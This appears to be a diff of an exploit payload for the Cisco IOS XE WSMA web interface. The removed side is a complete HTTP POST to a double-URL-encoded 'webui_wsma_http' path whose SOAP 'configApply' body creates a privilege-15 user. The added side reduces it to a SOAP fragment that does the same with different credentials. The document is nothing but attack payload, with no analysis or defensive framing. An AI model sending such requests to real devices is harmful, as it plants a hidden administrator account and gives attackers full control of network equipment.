@@ -1,36 +1,11 @@
-POST /%2577ebui_wsma_http HTTP/1.1
-Host: <target_ip>
-Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
-Accept-Language: en-us
-Connection: Keep-Alive
-Content-Type: application/soap+xml; charset=UTF-8
-Content-Length: <length>
-Pragma: no-cache
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
-Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
-
-<?xml version="1.0" encoding="UTF-8"?>
-<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/"
-               xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
-               xmlns:xsd="http://www.w3.org/2001/XMLSchema"
-               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-               xmlns:cisco="http://cisco.com/wsma/config/">
-
-  <SOAP:Header>
-    <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
-      <wsse:UsernameToken SOAP:mustUnderstand="false">
-        <wsse:Username>Tenable</wsse:Username>
-        <wsse:Password>Nessus</wsse:Password>
-      </wsse:UsernameToken>
-    </wsse:Security>
-  </SOAP:Header>
-
-  <SOAP:Body>
-    <configApply xmlns="http://cisco.com/wsma/config/">
-      <cli-config-data-block><![CDATA[conf t
-username pentest privilege 15 secret StrongPass123
-end]]></cli-config-data-block>
+<SOAP:Body>
+  <request xmlns="urn:cisco:wsma-config" correlator="01">
+    <configApply>
+      <config-data>
+        <cli-config-data-block>
+          username test privilege 15 secret Strongpass123
+        </cli-config-data-block>
+      </config-data>
     </configApply>
-  </SOAP:Body>
-
-</SOAP:Envelope>
+  </request>
+</SOAP:Body>
